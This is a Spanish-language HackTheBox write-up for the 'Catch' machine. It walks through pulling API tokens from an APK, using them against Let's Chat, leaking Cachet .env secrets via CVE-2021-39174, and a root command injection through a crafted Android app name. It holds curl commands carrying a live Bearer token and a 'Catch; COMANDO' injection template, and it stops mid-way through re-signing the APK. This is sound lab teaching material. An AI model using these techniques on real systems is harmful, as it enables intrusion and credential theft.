---
layout      : post
title       : "HackTheBox - Catch"
author      : lanz
image       : https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/catch/450banner.png
category    : [ htb ]
tags        : [ APK, command-injection, Cachet, API, lets-chat, .env, code-analysis ]
---
M√°quina Linux nivel medio. **Token** üéµ, vamos **API**e y **Let's Chat**! Jueguitos con variables de entorno en `Cachet`, credenciales volando y nombres de aplicaciones Android algo peligrosos.

![450catchHTB](https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/catch/450catchHTB.png)

## TL;DR (Spanish writeup)

**Creada por**: [MrR3boot](https://www.hackthebox.eu/profile/13531).

Algo tienes guardadito...

Empezamos investigando una web que nos descarga un **APK**, d√°ndole vueltas, encontramos unos tokens de autenticaci√≥n, jugando con ellos tendremos acceso a la **API** del servicio `Lets-Chat`, seguiremos jugando para encontrar en un chat unas credenciales v√°lidas para interactuar con el servicio `Cachet`.

La versi√≥n de **Cachet** con la que contamos tiene una vulnerabilidad que nos permite extraer variables usadas por el servicio almacenadas en archivos `.env`, usando esa informaci√≥n obtendremos otras credenciales, pero esta vez para saltar directamente al sistema como el usuario `will`.

Dentro del sistema encontraremos un script que hace unos chequeitos b√°sicos sobre pr√≥ximas **APKs** a ser ejecutadas/lanzadas, este script tiene c√≥digo interesante que podr√≠a involucrar tanto a **will** como a **root**, tendremos que inspeccionar l√≠nea a l√≠nea para llegar a una que por su l√≥gica nos permitir√≠a cambiando el nombre de la APP (no de la APK) obtener una inyecci√≥n de comandos :O

...

### Clasificaci√≥n de la m√°quina seg√∫n la gentesita

<img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/catch/450rating.png" style="display: block; margin-left: auto; margin-right: auto; width: 30%;"/>

<img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/catch/450statistics.png" style="display: block; margin-left: auto; margin-right: auto; width: 80%;"/>

La mayor√≠a de vulns reales, una que otra cosita media juguetona, pero en general tocando la realidad.

> El blog inicialmente fue para tener mis "notas", nunca se sabe, quizas un dia se me olvida todo üòÑ Despues surgio la otra idea, me di cuenta que esta es una puerta para personitas que como yo, al inicio (o simplemente a veces) nos estancamos en este mundo de la ciberseguridad y no sabemos que hacer o a quien recurrir, as√≠ que si puedo ayudarlos mientras me ayudo, ¬øpor que no hacerlo?

> Un detalle es que si ves mucho texto, es por que me gusta mostrar tanto errores como exitos y tambien plasmar todo desde una perspectiva m√°s de ense√±anza que de solo pasos a seguir. Demosle <3

...

Bailar, bailar y bailaaaar -

1. [Reconocimiento](#reconocimiento).
  * [Enumeraci√≥n de puertos con nmap](#enum-nmap).
2. [Enumeraci√≥n](#enumeracion).
  * [Obtenemos info del servidor web sobre el puerto 80](#puerto-80).
  * [Ahora del servidor sobre el puerto 3000](#puerto-3000).
  * [Tambi√©n del servidor sobre el puerto 5000](#puerto-5000).
  * [Y ahora del servidor del puerto 8000](#puerto-8000).
  * [Encontramos tokens caminando por la calle](#apk_leak_tokens).
3. [Explotaci√≥n](#explotacion).
  * [Leakeando variables de configuraci√≥n con **Cachet**](#cachet-leak-config).
4. [Escalada de privilegios](#escalada-de-privilegios).
  * [Compilamos y firmamos APKs con nombres chistosos](#apk-compile-sign).

...

# Reconocimiento [#](#reconocimiento) {#reconocimiento}

---

## Enumeraci√≥n de puertos con nmap [üìå](#enum-nmap) {#enum-nmap}

Vamos a encontrar que puertos (servicios) est√°n expuestos en esta m√°quina, para ellos emplearemos **nmap**:

```bash
‚ù± nmap -p- --open -v 10.10.11.150 -oG initScan
```

| Par√°metro | Descripci√≥n |
| --------- | :---------- |
| -p-       | Escanea todos los 65535                      |
| --open    | Solo los puertos que est√°n abiertos          |
| -v        | Permite ver en consola lo que va encontrando |
| -oG       | Guarda el output en un archivo con formato grepeable para usar una [funci√≥n llamada **extractPorts**](https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/magic/extractPorts.png) de [S4vitar](https://www.youtube.com/c/s4vitar) que me extrae los puertos en la clipboard |

Tenemos:

| Puerto | Descripci√≥n |
| ------ | :---------- |
| 22     | **[SSH](https://www.hackingarticles.in/ssh-penetration-testing-port-22/)**: Podemos obtener una Shell de forma segura. |
| 80     | **[HTTP](https://searchnetworking.techtarget.com/definition/port-80)**: Tenemos un servidor web. |
| 3000   | Probablemente otro servidor web. |
| 5000   | Probablemente otro servidor web. |
| 8000   | Probablemente otro servidor web. |

Ahora apoyados de nuevo de **nmap** vamos a intentar descubrir que versiones de software est√°n siendo ejecutadas en cada puerto y adem√°s ver si algunos scripts que tiene *nmap* nos descubren algo distinto a lo que ya tenemos.

**~(Usando la funci√≥n `extractPorts` (referenciada antes) podemos copiar r√°pidamente los puertos en la clipboard, en este caso no es necesario (ya que tenemos pocos puertos), pero si tuvi√©ramos varios evitamos tener que escribirlos uno a uno**
 
```bash
‚ù± extractPorts initScan 
[*] Extracting information...

    [*] IP Address: 10.10.11.150
    [*] Open ports: 22,80,3000,5000,8000

[*] Ports copied to clipboard
```

**)~**

```bash
‚ù± nmap -p 22,80,3000,5000,8000 -sC -sV 10.10.11.150 -oN portScan
```

| Par√°metro | Descripci√≥n |
| --------- | :---------- |
| -p        | Escaneo de los puertos obtenidos                       |
| -sC       | Muestra todos los scripts relacionados con el servicio |
| -sV       | Nos permite ver la versi√≥n del servicio                |
| -oN       | Guarda el output en un archivo                         |

Tenemos algunas cositas relevantes:

| Puerto | Servicio | Versi√≥n |
| :----- | :------- | :------ |
| 22     | SSH      | OpenSSH 8.2p1 |
| 80     | HTTP     | Apache 2.4.41 |
| 3000   | HTTP     | Ni idea |

* La web tiene este t√≠tulo: `Catch Repositories`, pa tener en cuenta.

| Puerto | Servicio | Versi√≥n |
| :----- | :------- | :------ |
| 5000   | HTTP     | Tampoco nos informa |

* Vemos: `Redirecting to /login`, un login üòÅ

| Puerto | Servicio | Versi√≥n |
| :----- | :------- | :------ |
| 8000   | HTTP     | Apache 2.4.29 |

* Otro texto llamativo: `Catch Global Systems`, quiz√°s la web principal.

Pues encontramos cositas, solo nos queda empezar a entenderlas, as√≠ que d√©mosle y rompamos esto!

# Enumeraci√≥n [#](#enumeracion) {#enumeracion}

---

## Vemos el servidor web del puerto 80 [üìå](#puerto-80) {#puerto-80}

<img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/catch/450page80.png" style="display: block; margin-left: auto; margin-right: auto; width: 100%;"/>

Hay 3 cositas interesantes:

> (1) We're now providing mobile version of our status site.

Esto se relaciona con el bot√≥n **Download Now**, ya que nos provee de un aplicativo m√≥vil **(2)**, si la descargamos tenemos:

```bash
‚ù± ls
catchv1.0.apk
```

Antes de jugar con ella sigamos explorando la web y los dem√°s sitios.

Y **(3)** la tercera cosita llamativa es esta l√≠nea: 

> The future enhancements includes Lets-chat/Gitea integration.

Ya que nos cuenta (y se puede relacionar con lo que ya tenemos) dos cosas: "las futuras mejoras incluyen" un chat (vimos un redirect a un **login** en el puerto `5000`, hay que revisar si tiene relaci√≥n) y una referencia a **Gitea** (gestor de contenido - contiene repositorios, lo vimos en el puerto `3000`). As√≠ que llamativo...

## Vemos el servidor web del puerto 3000 [üìå](#puerto-3000) {#puerto-3000}

<img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/catch/450page3000.png" style="display: block; margin-left: auto; margin-right: auto; width: 100%;"/>

Efectivamente, **Gitea** en su versi√≥n `1.14.1`.

> "<u>Gitea</u> es un paquete de software de c√≥digo abierto para alojar el control de versiones de desarrollo de software utilizando Git, as√≠ como otras funciones de colaboraci√≥n como el seguimiento de errores y los wikis." ~ [Wikipedia](https://es.wikipedia.org/wiki/Gitea)

Buscando exploits con esa versi√≥n no logramos nada, e intentando credenciales por default tampoco, as√≠ que mov√°monos al otro puerto, ya que este ser√° importante si llegamos a obtener credenciales.

## Vemos el servidor web del puerto 5000 [üìå](#puerto-5000) {#puerto-5000}

<img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/catch/450page5000.png" style="display: block; margin-left: auto; margin-right: auto; width: 100%;"/>

OPAAA, pues si tenemos un chat y tambi√©n el redirect a la ruta `/login`!

> "Self-hosted chat app for small teams" ~ [lets-chat](https://sdelements.github.io/lets-chat/)

Buscando vulnerabilidades no vemos gran cosa, as√≠ que lo mismo, qued√©monos que cuando tengamos credenciales vamos a poder (intentar al menos) ingresar a chatear!

## Vemos el servidor web del puerto 8000 [üìå](#puerto-8000) {#puerto-8000}

<img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/catch/450page8000.png" style="display: block; margin-left: auto; margin-right: auto; width: 100%;"/>

Nos muestra lo que parece ser un <<log>> de "incidentes" por d√≠a, lo cual es muy llamativo, ya que quiz√°s debamos irnos fechas antes a buscar incidentes, habr√° que ver...

Inspeccionando el sitio encontramos un redirect al `/dashboard`, pero as√≠ mismo al no tener una sesi√≥n iniciada obtenemos un **login** para generarla:

<img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/catch/450page8000_login.png" style="display: block; margin-left: auto; margin-right: auto; width: 100%;"/>

> "The open source status page system" ~ [cachethq](http://cachethq.io/)

Lo interesante es que esta app [tiene una API](https://docs.cachethq.io/docs/advanced-api-usage) en su documentaci√≥n, pueda que por ah√≠ logremos ver todos los incidentes, pero por ahora no tenemos m√°s :(

Pero tambi√©n encontramos locuras al buscar `cachet exploit` en la web, como este [**SQLi Time-Based**](https://github.com/advisories/GHSA-79mg-4w23-4fqc), el cual podemos probar con este exploit que extrae un hash (contrase√±a) del usuario `admin`:

* [https://github.com/W0rty/CVE-2021-39165](https://github.com/W0rty/CVE-2021-39165)

Solo que para fines de la m√°quina no nos es relevante.

...

De todo lo enumerado y obtenido podemos enfocarnos en dos cositas, el **APK** y el tema de los incidentes, a darle!

...

## Encontramos tokens caminando por la calle [üìå](#apk_leak_tokens) {#apk_leak_tokens}

Antes de volvernos locos con el APK y jugar con an√°lisis din√°mico (emuladores), veamos cositas est√°ticas, por ejemplo texto interesante, c√≥digo, etc.

Para decompilar (ver todos los objetos que componen el `.apk`) podemos hacerlo de distintas formas, yo usar√© `apktool`, ya que si jugamos con `unzip` (el **apk** a fin de cuentas es un <u>zip</u> (compru√©balo con `file <APK>`)) hay algunos objetos que no revelan por completo su contenido, y usando `apktook` si lo logramos (:

* [https://ibotpeaches.github.io/Apktool/documentation/](https://ibotpeaches.github.io/Apktool/documentation/)
* [https://ibotpeaches.github.io/Apktool/](https://ibotpeaches.github.io/Apktool/)

---

```bash
‚ù± apktool d catchv1.0.apk -o apk_content
```

Y:

```bash
‚ù± ls
apk_content  catchv1.0.apk
‚ù± cd apk_content
‚ù± ls -lago
total 8
drwxr-xr-x 1   92 jul 18 16:39 .
drwxr-xr-x 1   48 jul 18 16:39 ..
-rw-r--r-- 1  980 jul 18 16:39 AndroidManifest.xml
-rw-r--r-- 1 2179 jul 18 16:39 apktool.yml
drwxr-xr-x 1   54 jul 18 16:39 original
drwxr-xr-x 1 3312 jul 18 16:39 res
drwxr-xr-x 1   36 jul 18 16:39 smali
```

Pero dando vueltas entre el c√≥digo y el texto no logre ver nada, as√≠ que con mi poco conocimiento sobre Android y APKs ca√≠ en la web y encontr√© este repo: [MobSF](https://github.com/MobSF/Mobile-Security-Framework-MobSF):

> "Mobile Security Framework (MobSF) is an automated, all-in-one mobile application (Android/iOS/Windows) pen-testing, malware analysis and security assessment framework capable of performing static and dynamic analysis." ~ [MobSF](https://github.com/MobSF/Mobile-Security-Framework-MobSF)

Es una tool muy completa, la [instalamos](https://mobsf.github.io/docs/#/installation) y [ejecutamos](https://mobsf.github.io/docs/#/running):

```bash
‚ù± ./run.sh 127.0.0.1:8000
```

Y si ahora vamos al localhost sobre ese puerto:

<img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/catch/450page_localhost8000_mobsf_home.png" style="display: block; margin-left: auto; margin-right: auto; width: 100%;"/>

Pues procedamos, subamos el `.apk` a ver qu√© an√°lisis realiza y que encuentra...

<img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/catch/450page_localhost8000_mobsf_fileUploaded.png" style="display: block; margin-left: auto; margin-right: auto; width: 100%;"/>

Pues ah√≠ tenemos tooooooda la info que recolecto, si nos fijamos en toda la derecha el scrollbar es gigante, pero para ir por secciones nos ayudamos del men√∫ de la izquierda, as√≠ que hay mucho por ver...

Dando rodeos caemos en 2 cositas muuuuuy interesantes:

<img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/catch/450page_localhost8000_mobsf_subdomainFound.png" style="display: block; margin-left: auto; margin-right: auto; width: 100%;"/>

<img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/catch/450page_localhost8000_mobsf_tokensFound.png" style="display: block; margin-left: auto; margin-right: auto; width: 100%;"/>

Hay un subdominio, peeeero no tenemos el puerto `443` para tener alg√∫n servicio web con certificado digital (por el http<u>s</u>), sin embargo, guard√©moslo por si algo.

Yyyyyy hay unos tokens ([podemos pensar que son de autenticaci√≥n](https://www.inwebo.com/es/authentication-token/) con nombres relacionados con servicios que tiene corriendo la m√°quina, as√≠ que juguemos a ver si nos sirven de algo (ah y no encontramos nada m√°s :P).

# Explotaci√≥n [#](#explotacion) {#explotacion}

Para lograr jugar con ese token debemos hacer uso de alg√∫n modificador de headers o sencillamente una API relacionada con el servicio, yo tom√© la segunda opci√≥n (:

Probando inicialmente con la [API de **gitea**](https://docs.gitea.io/en-us/api-usage/) no logramos nadita, el siguiente turno es la [API de **lets-chat**](https://github.com/sdelements/lets-chat/wiki/API).

Para descubrir que tipo de hash tenemos y si es funcional vamos a empezar con la [autenticaci√≥n](https://github.com/sdelements/lets-chat/wiki/API%3A-Authentication):

<img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/catch/450google_letsChatAPI_authentication.png" style="display: block; margin-left: auto; margin-right: auto; width: 100%;"/>

Buscando obtenemos esta forma de usar el token con `curl`:

<img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/catch/450google_howTOuseBEARERtokenWITHcurl.png" style="display: block; margin-left: auto; margin-right: auto; width: 100%;"/>

Probemos sin/con el token para ver una [lista de usuarios](https://github.com/sdelements/lets-chat/wiki/API%3A-Users):

```bash
‚ù± curl -X GET -H 'Content-Type: application/json' http://10.10.11.150:5000/users
```

Obtenemos:

```bash
Unauthorized
```

Y ahora agregando el **token**:

```bash
‚ù± curl -X GET -H 'Content-Type: application/json' -H 'Authorization: Bearer NjFiODZhZWFkOTg0ZTI0NTEwMzZlYjE2OmQ1ODg0NjhmZjhiYWU0NDYzNzlhNTdmYTJiNGU2M2EyMzY4MjI0MzM2YjU5NDljNQ==' http://10.10.11.150:5000/users
```

<img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/catch/450bash_curlLETSCHATwithTOKEN_users.png" style="display: block; margin-left: auto; margin-right: auto; width: 100%;"/>

(Apoyados de [jq](https://www.baeldung.com/linux/jq-command-json) hacemos que el output sea correctamente formateado a **JSON** (adem√°s de ser lindo))

PUES TENEMOS ACCESO USANDO EL TOKEEEEEEEEEEEEEEEEEEEEEEEEEEEN!! Pefeto, ahora a explorar y extraer info, por ejemplo todos los usuarios:

```bash
‚ù± curl -...on' -H 'Aut...==' http://10.10.11.150:5000/users | jq '.[] | .username'
```

```bash
"admin"
"john"
"will"
"lucas"
```

Los podemos guardar por si algo (:

Tambi√©n encontramos las [distintas "salas" (rooms)](https://github.com/sdelements/lets-chat/wiki/API%3A-Rooms) que existen para chatear:

```bash
‚ù± curl -...on' -H 'Aut...==' http://10.10.11.150:5000/rooms
```

<img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/catch/450bash_curlLETSCHATwithTOKEN_rooms.png" style="display: block; margin-left: auto; margin-right: auto; width: 100%;"/>

Descripciones interesantes:

```bash
"Cachet Updates and Maintenance"
"Android App Updates, Issues & More"
"New Joinees, Org updates"
```

Tambi√©n existe una ruta llamada `messages`, que claramente [juega con los mensajes (chats)](https://github.com/sdelements/lets-chat/wiki/API%3A-Messages) que existan en cada "sala".

Apoyados de la API vemos que podemos [listar pasando el **id** de la sala](https://github.com/sdelements/lets-chat/wiki/API%3A-Messages#get-roomsroommessages), usemos `New Joinees, Org updates`:

```bash
‚ù± curl -...on' -H 'Aut...==' http://10.10.11.150:5000/messages?room=61b86b3fd984e2451036eb18 | jq
‚ù± curl -...on' -H 'Aut...==' 'http://10.10.11.150:5000/messages?room=61b86b3fd984e2451036eb18&reverse=false' | jq
### reverse=false : Hace que veamos los mensajes del primero al ultimo
```

<img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/catch/450bash_curlLETSCHATwithTOKEN_messagesROOMorg.png" style="display: block; margin-left: auto; margin-right: auto; width: 100%;"/>

No hay nada relevante, solo nombres que ya descubrimos antes, si miramos el chat `Android App Updates, Issues & More` tampoco hay nada cautivador, peeeero si miramos `Cachet Updates and Maintenance`, √±a√±a√±aiii:

```bash
‚ù± curl -...on' -H 'Aut...==' 'http://10.10.11.150:5000/messages?room=61b86b28d984e2451036eb17&reverse=false' | jq
```

<img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/catch/450bash_curlLETSCHATwithTOKEN_messagesROOMmaintenance.png" style="display: block; margin-left: auto; margin-right: auto; width: 100%;"/>

Encontramos una conversaci√≥n donde **john** le pide al **admin** que si le crea una cuenta por favor, yyyyyyy el **admin** procedioooooo! Probando en `lets-chat` (puerto 5000) notamos que no son v√°lidas, pues hagamos reutilizaci√≥n de contrase√±as y veamos si obtenemos una sesi√≥n en otro servicio:

* Tampoco lo son en `gitea` (puerto 3000)
* Ni jugando con `SSH`.

Peeeero con `cachet` (puerto 8000), ajaaai!

<img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/catch/450page8000_dashboard.png" style="display: block; margin-left: auto; margin-right: auto; width: 100%;"/>

Logramos entrar! Exploremos...

## Leakeando variables de configuraci√≥n con <u>Cachet</u>[üìå](#cachet-leak-config) {#cachet-leak-config}

Recorriendo el sitio obtenemos la versi√≥n de **Cachet** que est√° siendo usada:

<img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/catch/450page8000_settings_version.png" style="display: block; margin-left: auto; margin-right: auto; width: 100%;"/>

La `2.4.0-dev`, pos buscando en la web vulnerabilidades contra ella, tenemos este post mencionando algunas:

* [Cachet 2.4: Code Execution via Laravel Configuration Injection](https://blog.sonarsource.com/cachet-code-execution-via-laravel-configuration-injection/)

Existen 3 CVEs listados en el post:

* CVE-2021-39172 - Remote Code Execution
* CVE-2021-39174 - Configuration Leak
* CVE-2021-39173 - Forced Reinstall

Les recomiendo leer la gran explicaci√≥n del post sobre el **CVE-2021-39172 (RCE)**, ya que de ah√≠ se entiende muuucho m√°s el que realmente logramos explotar: `CVE-2021-39174` (Config Leak).

La explotaci√≥n se basa en que **Cachet** expone varias configuraciones al p√∫blico, estas son almacenadas tanto en una base de datos como en un objeto usado por la app. **Cachet** utiliza el framework **Laravel** que usa archivos de configuraci√≥n `dotenv` (o `.env`) estos objetos son similares a los usados en **bash** para almacenar variables de entorno (`${VARIABLE_NAME}`). 

> Jugando se logra descubrir (ver) distintas variables de entorno en los campos que tenemos de la web.

* [Esta es la documentaci√≥n de **.env** en **php**](https://github.com/vlucas/phpdotenv#why-env)

En las configuraciones del proveedor de correos existen los problemitas locos:

<img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/catch/450page8000_settings_mail.png" style="display: block; margin-left: auto; margin-right: auto; width: 100%;"/>

(De nuevo, mira el [post](https://blog.sonarsource.com/cachet-code-execution-via-laravel-configuration-injection/) y entiende a fondo el "como funciona" y "el por que" de esta vuln)

El post nos indica que hay algunas variables por default que siempre est√°n en los objetos `.env`, como:

```bash
APP_KEY
DB_PASSWORD
MAIL_PASSWORD
```

Entonces la idea es aprovechar que los `.env` almacenan variables que pueden ser invocadas como si estuvi√©ramos en una Shell (`${VARIABLE}`), para exponerlas en esos inputs contenedores de las configuraciones del correo. Hag√°mosle para que quede claro...

Probemos primero con `APP_KEY`:

<img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/catch/450page8000_settings_mail_filtrate_appKey.png" style="display: block; margin-left: auto; margin-right: auto; width: 100%;"/>

Hacemos clic en `Save`, refrescamos la p√°gina yyyyyy:

<img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/catch/450page8000_settings_mail_filtrate_appKey_DONE.png" style="display: block; margin-left: auto; margin-right: auto; width: 100%;"/>

EEEEEPA! Logramos la explotaci√≥n, obtener tanto el valor de la variable `APP_KEY` como tambi√©n saber que el input `Mail From Address` es el vulnerable en este caso (: As√≠ que vayamos m√°s profundo, intentemos `DB_PASSWORD` y si obtenemos respuesta deber√≠amos por intuici√≥n intentar `DB_USERNAME`:

<img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/catch/450page8000_settings_mail_filtrate_dbPassword.png" style="display: block; margin-left: auto; margin-right: auto; width: 100%;"/>

<img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/catch/450page8000_settings_mail_filtrate_dbPassword_DONE.png" style="display: block; margin-left: auto; margin-right: auto; width: 100%;"/>

Perfecto, tenemos una contrase√±a, miremos si obtenemos el usuario propietario:

<img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/catch/450page8000_settings_mail_filtrate_dbUsername.png" style="display: block; margin-left: auto; margin-right: auto; width: 100%;"/>

<img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/catch/450page8000_settings_mail_filtrate_dbUsername_DONE.png" style="display: block; margin-left: auto; margin-right: auto; width: 100%;"/>

Puessss perfecto, tenemos unas credenciales para el usuario `will` que est√°n siendo usadas como gestor de la DB usada en **Cachet** üòÅ ¬øPero de qu√© nos sirve esto? AYYYYY! Juguemos con reutilizaci√≥n de contrase√±as √±a√±ai!

Al intentarlas contra `SSH` obtenemoooooos:

<img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/catch/450bash_willSH.png" style="display: block; margin-left: auto; margin-right: auto; width: 100%;"/>

UNA SHELL COMO **will**! Pos a ver como nos convertimos en `root` (:

# Escalada de privilegios [#](#escalada-de-privilegios) {#escalada-de-privilegios}

Si nos vamos a la ruta `/opt` (que por lo general ah√≠ se guardan herramientas de terceros) encontramos:

```bash
will@catch:/opt$ ls -a
.  ..  containerd  mdm
```

Y dentro de `mdm` (**Mobile Device Manager**, toma sentido cuando vemos su contenido):

```bash
will@catch:/opt/mdm$ ls -la
total 16
drwxr-x--x+ 3 root root 4096 Mar  3 14:23 .
drwxr-xr-x  4 root root 4096 Dec 16  2021 ..
drwxrwx--x+ 2 root root 4096 Jul 21 00:10 apk_bin
-rwxr-x--x+ 1 root root 1894 Mar  3 14:23 verify.sh
```

Una carpeta para guardar binarios **APK** y un script con este contenido:

> [verify.sh](https://github.com/lanzt/blog/blob/main/assets/scripts/HTB/catch/verify.sh)

Esto es bastante curioso, ya que la mayor√≠a de rutas involucran a `/root`, solo que tambi√©n a la carpeta que vimos antes: `apk_bin`, En esta carpeta tenemos acceso de escritura, as√≠ que podemos pensar que este script est√° siendo usado por el administrador para hacer alg√∫n tratamiento a las distintas APKs que existan en esa ruta del sistema :O

Pues entendamos un poco el script y veamos si existe alguna cosita mal escrita o mal pensada de la que nos podamos aprovechar!

1Ô∏è‚É£ Tenemos inicialmente la funci√≥n `sig_check` en la que se valida si la APK est√° firmada (si cuenta con un certificado digital) usando la herramienta [jarsigner](https://www.theserverside.com/blog/Coffee-Talk-Java-News-Stories-and-Opinions/jarsigner-digitially-sign-JARs-Java-keytool-certificates):

```bash
...
jarsigner -verify "RUTA/DEL/ARCHIVO"
...
```

Que si hacemos la prueba con el APK que descargamos al inicio de la m√°quina y donde obtuvimos los tokens, tenemos:

```bash
‚ù± jarsigner -verify catchv1.0.apk

jar verified.
```

Si est√° firmada pasamos a otra fase:

2Ô∏è‚É£ Usando la funci√≥n `comp_check` confirma que el APK tenga una `version SDK compatible`, para ello lo que hace es decompilar el **APK** (¬ørecuerdas que lo hicimos al inicio?) y leer del objeto `AndroidManifest.xml` la versi√≥n del **SDK**:

> Seg√∫n [una respuesta de **stackoverflow**](https://stackoverflow.com/questions/26694108/what-is-the-difference-between-compilesdkversion-and-targetsdkversion#answer-26694276) la `compileSdkVersion` es la version de la API con la que la APP ha sido compilada, esto quiere decir que ser√° la version compatible con **Android features** (plugins, etc.)

```bash
...
apktool d -s "RUTA/DEL/ARCHIVO" -o DONDE/QUEREMOS/GUARDAR/EL/OUTPUT
grep -oPm1 "(?<=compileSdkVersion=\")[^\"]+" "DONDE/QUEREMOS/GUARDAR/EL/OUTPUT/AndroidManifest.xml"
...
```

Que si hacemos de nuevo la prueba:

```bash
‚ù± apktool d catchv1.0.apk -o aca_esta_en_pedazitos
‚ù± cd aca_esta_en_pedazitos/
‚ù± ls -a
.  ..  AndroidManifest.xml  apktool.yml  original  res  smali
```

```bash
‚ù± grep -oPm1 "(?<=compileSdkVersion=\")[^\"]+" "aca_esta_en_pedazitos/AndroidManifest.xml"
32
```

Si nos devuelve una versi√≥n y adem√°s es mayor a **18** podemos pasar a la √∫ltima fase:

3Ô∏è‚É£ Por medio de la funci√≥n `app_check` extrae el nombre de la aplicaci√≥n para comprobar si en √©l existe la cadena de texto "**Catch**":

```bash
...
grep -oPm1 "(?<=<string name=\"app_name\">)[^<]+" "DONDE/QUEREMOS/GUARDAR/EL/OUTPUT/res/values/strings.xml"
...
if [[ $APP_NAME == *"Catch"* ]]; then
    echo -n $APP_NAME|xargs -I {} sh -c 'mkdir {}'
    mv "UNA/RUTA/$APK_NAME" "OTRA/RUTA/$APP_NAME/UN_ARCHIVO"
    ...
...
```

En el `if` notamos un comando para crear carpetas en el sistema: `mkdir`, entendamos qu√© est√° haciendo antes de especular:

```bash
‚ù± grep -oPm1 "(?<=<string name=\"app_name\">)[^<]+" "aca_esta_en_pedazitos/res/values/strings.xml"
Catch
```

Perfecto contiene la cadena, ahora el `if`:

```bash
‚ù± cat test_xargSh.sh 
```

```bash
APP_NAME="Catch"

if [[ $APP_NAME == *"Catch"* ]]; then
    echo -n $APP_NAME|xargs -I {} sh -c 'mkdir {}'
fi
```


```bash
‚ù± ./test_xargSh.sh
‚ù± ls
Catch
```

Pos efectivamente nos crea una carpeta donde SU nombre es EL nombre de la aplicaci√≥n!!! WOWOWOWOWOW. Esto est√° muuy interesante, sobretodo si miramos bien el `if`: no busca exactamente `Catch`, sino que entre TOOOODA la cadena mira si en ella existe ese substring :O

¬øPor lo que, qu√© se te ocurre?

EXAAACTO, si logramos una manera de tener control sobre el nombre de la aplicaci√≥n, podr√≠amos aprovechar el uso que hace con `xargs ... sh` para enviar en el nombre de la app otro comando, algo as√≠:

```txt
Nombre Original: Catch
Comando original: mkdir Catch
Nombre Exploit: Catch; COMANDO
Comando Exploit: mkdir Catch; COMANDO
```

Por lo que lograr√≠amos una inyecci√≥n de comandos bien guapetona (: Pero claro, antes de eso debemos modificar el nombre de la app, volverla a compilar, firmarla y subirla a la m√°quina v√≠ctima a ver si es verdad que **root** est√° de vez en cuando revisando esa carpeta y finalmente obtener la ejecuci√≥n de comandos, a darle!

## Compilamos y firmamos APK con nombre chistoso [üìå](#apk-compile-sign) {#apk-compile-sign}

üõéÔ∏èüõéÔ∏èüõéÔ∏è ***(Probaremos a ejecutar el comando `id` y que su resultado sea enviado a un puerto de nuestro sistema)***

Como realmente no interesa si el APK va a ser ejecutado (o sea, no debemos generar un APK con contenido en su ejecuci√≥n malicioso), entonces podemos usar el mismo objeto `catchv1.0.apk` para jugar.

üñï El primer paso ya est√°, el de decompilar el **APK** para tener todo su contenido fragmentado:

```bash
‚ù± apktool d catchv1.0.apk -o aca_esta_en_pedazitos
# d = decode
```

* [https://ibotpeaches.github.io/Apktool/documentation/](https://ibotpeaches.github.io/Apktool/documentation/)

üíï Ahora debemos modificar el nombre de la app:

Ya sabemos de donde la saca, as√≠ que sabemos donde debemos cambiarla.

<img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/catch/450bash_willSH_catSTRINGSxml_appname.png" style="display: block; margin-left: auto; margin-right: auto; width: 100%;"/>

Abrimos el objeto en modo escritura y agregamos nuestro comando, finalmente quedar√≠a as√≠:

<img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/catch/450bash_willSH_catSTRINGSxml_appname_PAYLOAD.png" style="display: block; margin-left: auto; margin-right: auto; width: 100%;"/>

üñ±Ô∏è En este paso debemos reconstruir la APP, o sea compilarla (generar el APK), usaremos tambi√©n `apktool`:

```bash
‚ù± apktool b aca_esta_en_pedazitos/
```

<img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/catch/450bash_apktool_b_APKwithIDtoNC.png" style="display: block; margin-left: auto; margin-right: auto; width: 100%;"/>

Esto lo que hace es generar una carpeta llamada `/dist` dentro de **aca_esta_en_pedazitos** con el APK generado:

```bash
‚ù± ls aca_esta_en_pedazitos/dist/
catchv1.0.apk
```

Este es el APK que subiremos (: El maaaaliciosooooowooooooo :P

üçÄ Pero antes necesitamos firmarlo con un certificado digital:

* [Me apoy√© de este post: Decompile and Compile an Android APK](https://medium.com/@sandeepcirusanagunla/decompile-and-recompile-an-android-apk-using-apktool-3d84c2055a82)

Solo que antes de firmarlo debemos generar una llave que estar√° asociada a ese certificado, usaremos `keytool`...

```bash
‚ù± cd aca_esta_en_pedazitos/dist/
‚ù± keytool -genkey -v -keystore juguito_de_mora.keystore -alias mora -keyalg RSA -keysize 2048 -validity 10000
```

